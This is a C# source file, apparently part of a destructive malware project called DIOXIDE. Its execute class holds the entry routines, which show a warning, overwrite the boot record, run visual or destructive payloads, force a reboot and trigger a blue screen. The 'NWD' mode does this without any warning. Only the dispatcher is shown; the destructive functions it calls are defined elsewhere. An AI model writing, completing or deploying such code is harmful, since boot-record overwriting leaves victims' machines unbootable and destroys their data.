using System;
using System.Windows.Forms;
using static DIOXIDE.Functions;

namespace DIOXIDE
{
    class execute
    {
        public static void executeEWP()
        {
            destruction destruction = new destruction();

            Application.EnableVisualStyles();

            destruction.WARNING();

            Sleep( 5000 );

            run_payloads.PStart();

            Environment.Exit( 0 );
        }
        public static void executeNWD()
        {
            destruction destruction = new destruction();

            Application.EnableVisualStyles();

            destruction.OverwriteBoot();

            Sleep( 5000 );

            run_payloads.DStart();

            destruction.ForceRebootComputer();
            destruction.BSOD();

            Environment.Exit( 0 );
        }
        public unsafe static void executeP()
        {
            Application.EnableVisualStyles();

            Sleep( 5000 );

            run_payloads.PStart();

            Environment.Exit( 0 );
        }
        public static void executeD()
        {
            destruction destruction = new destruction();

            Application.EnableVisualStyles();

            destruction.WARNING();

            destruction.OverwriteBoot();

            Sleep( 5000 );

            run_payloads.DStart();

            destruction.ForceRebootComputer();
            destruction.BSOD();

            Environment.Exit( 0 );
        }
    }
}
